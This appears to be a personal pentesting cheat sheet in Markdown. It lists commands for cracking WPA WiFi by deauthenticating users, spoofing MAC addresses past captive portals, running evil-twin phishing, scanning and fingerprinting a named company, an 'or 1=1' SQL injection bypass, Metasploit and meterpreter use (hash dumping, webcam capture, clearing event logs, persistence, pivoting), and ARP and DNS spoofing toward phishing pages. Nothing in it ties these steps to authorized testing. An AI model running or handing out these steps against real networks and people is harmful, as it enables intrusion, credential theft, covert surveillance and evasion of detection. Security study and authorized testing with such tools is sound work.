# pentesting

# linux commands and other details
sudo bash - to use admin </br>
pwd - prints working directory </br>
cd - canges directory </br>
ls - lists everything in directory -l means special format -a means all </br>
echo "hello" > new.txt </br>
locate new.txt - if not working </br>
updatedb - and retry </br>
man *any command* for help </br>
cp - copy </br>
rm - delete </br>
mv - move </br>
eg. mv new.txt Desktop/new.txt </br>
go to command ls -la [will list all files in best way + hidden] </br>
chmod - read write access </br>
chmod 777 [rwx all on]</br>
chmod +x new.txt - makes it executable to all users </br>
adduser bob </br>
important shows users and other details</br>
cat is mostly used to display</br>
cat etc/passwd </br>
crack pass linux here</br>
cat etc/shadow </br>
su bob - switch user</br>
su - [for root switch]</br>
ifconfig [ip details]</br>
iwconfig </br>
arp -a - Mac address and ip address association </br>
netstat -ano - all open ports/ info</br>
route - routing table</br>
[if the above commands do not work, update db and update net-tools] </br>
history - see old commands/ most used </br>
echo "hello" >> new.txt - to write additital lines by not overwriting</br>
service apache2 start </br>
service ssh start </br>
service postgresql start </br>
service apache2 stop </br>
not gurantee to start upon boot then do the following</br>
systemctl enable ssh </br>
not to start by own </br>
apt purge **application** </br>

# Anonymity

nano /etc/proxychains.conf</br>
Enable dynamic chain proxies</br>
Disable random chain</br>
Enable proxy_dns</br>
Tor proxy in proxy list - 127.0.0.1 9050 with socks5</br>
start tor</br>
proxychains *browser* *website*</br>
anonsurf is a good alternative</br>
macchanger</br>
nano /etc/resolv.conf - edit ip to 1.1.1.1 against DNS leak</br>
DNS annonimity - nano /etc/dhcp/dhclient.conf add more DNS server to prepend domain-name-servers</br>
VPN vpn book certificate download then run command - openvpn *filename*</br>
Use tails os on usb - complete anonimity</br>
</br>
</br>

# WIFI Hacking
Method 1 (WPA/WPA2) :</br>
ifconfig to check name - wlan0 commonly used</br>
ifconfig wlan0 down</br>
iwconfig wlan0 mode monitor</br>
ifconfig wlan0 up</br>
alternatively, airmon-ng start wlan0</br>
wlan0 is now in monitor mode - check by iwconfig</br>
airodump-ng wlan0</br>
airodump-ng --bssid *mac of target wifi* --channel *ch no.* --write *filename* wlan0</br>
This will create handshake.cap file</br>
Kick a user by - aireplay-ng -0 0 -a *bssid* wlan0</br>
Wait until handshake is captured</br>
aircrack-ng -w *wordlist* *handshake.cap*</br>
</br>
Method 2 (WPA/WPA2):</br>
type wifite and press enter and follow instructions (if wifite -all easy bois)</br>
</br>
Method 3 Free wifi captive portal:</br>
Use method one's steps to first find mac of connected device</br>
macchanger to change mac address to connected device (first down wlan0)</br>
sudo macchanger -m *target mac* wlan0</br>
alternatively use wireshark and analyze *handshake.cap* for POST method</br>
</br>
Method 4 (Social Engineering - Phishing)</br>
install wifiphisher and roguehostapd</br>
enable monitor mode from metod 1</br>
wifiphisher --force-hostapd</br>
</br>
Method 5 (Social Engineering - Evil Twin):</br>
install ccze;install airgeddon</br>
sudo bash ./airgeddon.sh and follow instructons</br>

# OSINT

Target Validation - WHOIS, nslookup, dnsrecon</br>
Finding Subdomains - GoogleFu,dig.Nmap,Sublist3r,Bluto,crt.sh</br>
Fingerprinting - Nmap, Wappalyzer,WhatWeb,BuiltWith,Netcat</br>
Data Breaches - HaveIBeenPwned</br>
hunter.io - public emails of company</br>
Biggest password Dump - https://github.com/philipperemy/tensorflow-1.4-billion-password-analysis</br>
theharvester -d tesla.com -l 500 -b google.com [used for email harvesting]</br>
bluto - pretty good osint tool</br>
crt.sh - Wildcard like %.tesla.com to find subdomains</br>
wappalizer - fingerprinting or tech behind the scenes</br>
whatweb -v tesla.com fingerprinting</br>
waybackmachine/bugbounty reports/ builtwith.com</br>

# Nmap 
Search major ip block - to get ip ranges of companies</br>
Then search in whois for more info</br>
nslookup *ip or domain name*</br>
nmap -sn *ip address* for port scan </br>
nmap -Pn *ip address* for port scan if error</br>
nmap -T4 -A -p--vv --open *ip address* > result.txt </br>
Also do staging by removing -A and doing specific ports</br>
nmap -T4 -sU -p1-100 *ip address* for UDP scanning</br>
nmap -sC *ip address*</br>
ls -la usr/share/nmap/scripts</br>
nmap --script=ssh.hostkey.nse *ip address*</br>
use wafwoof to detect web firewalls then use decoy in nmap</br>
nmap -F -D *ip address* or RND:*no.* *url*</br>
</br>
</br>
# More Scanning tools
Use wireshark to see network traffic - can also find out antivirus</br>
Use nessus for web scanning</br>
Use burpsuite to do web exploits</br>
# Password cracking
Method 1 (Custom Dictionary Attack): 
Use CUPP to get initial wordlist</br>
Then use mentalist to make it cater for website requirements</br>
Alternatively, use wordlister</br>
</br>
Method 2 (Wordlist from data leaks): 
Use pipal - ruby2.5 pipal --top 500 --output *result.pipal* ../leakedpass.txt</br>
Analyze the data and then use method one.</br>
</br>
# SQL injection
SELECT * FROM tablename WHERE username = 'name' AND password = 'pass';</br>
SELECT * FROM tablename WHERE username = 'name' AND password = 'pass' or 1=1 #';</br>
sqlmap can be used for more exploit [master command --os-shell]</br>
# Metasploit
searchsploit *search term* for public exploits</br>
Use scanning methods to find ports/vulnarabilities</br>
msfdb init - to configure msfdb</br>
msfconsole- to start metasploit</br>
Important commands - search type:*category* *ur find*,use,show options,info,set,exploit,background,back</br>
If buffer overflow is available - show payloads</br>
Can also use metasploit community web framework</br>
cd usr/share/metasploit-framework/modules </br>
Use Evasion tools for not getting detected by antivirus</br>
In msf console go to exploit/multi/handler for meterpreter </br>
use exploit/multi/handler -  to start listening </br>
set payload *relivent payload*
Meterpreter - is a shell tool with a lot of featres</br>
</br>
</br>
Common meterpreter commands:</br>
download *filename*, upload *filename* *destination*, getuid, ipconfig, sessions, ps</br>
webcam_list, webcam_snap, run post/windows/gather/hashdump </br>
Guide to escalate priviledge and clear tracks:</br>
getsystem</br>
getprivs</br>
upload fgdump and run it</br>
get output and crack it in JacktheRipper</br>
use shell command if requires</br>
clearev in meterpretr to clear tracks</br>
run persistence (to maintain access)</br>
</br>
</br>
After hacking, to go for more devices in network:</br>
Find the other ip addresses on the machine - ifconfig etc...</br>
go back to msf, search pingsweep to find the tool and then use it</br>
route add *subnet or destination.0* *netmask* *session id*</br>
if in meterpreter - run autoroute -s *subnet*</br>
route print</br>
now do some scanning with msf</br>
migrate to high priority PID to maintain good access</br>
search to_meterpreter if meterpreter is not established</br>
</br>
</br>
Alternatively, portfwd add -l *our port* -p *their port* -r *target ip*</br>
Now use tools normally with loacalhost and port</br>
Can also - use auxiliary/server/socks5 - then set up route and access</br>
go to etc/proxychains.conf to enable the chain</br>
proxychains *commands*</br> 

# Man in the middle
ARP spoofing:</br>
arpspoof -i wlan0 -t *target ip* *router ip.1*</br>
arpspoof -i wlan0 -t *router ip.1* *target ip*</br>
Now use wireshark/dsniff etc to monitor the traffic</br>
</br>
Ettercap (DNS spoofing):</br>
nano /etc/ettercap/etter.conf and enable linux ip tables</br>
nano /etc/ettercap/etter.dns</br>
edit microsoft domain names and ip to phising page domain names and ip</br>
To stop it first sto all process in etter then,</br>
ifconfig wlan0 down</br>
ifconfig wlan0 up</br>
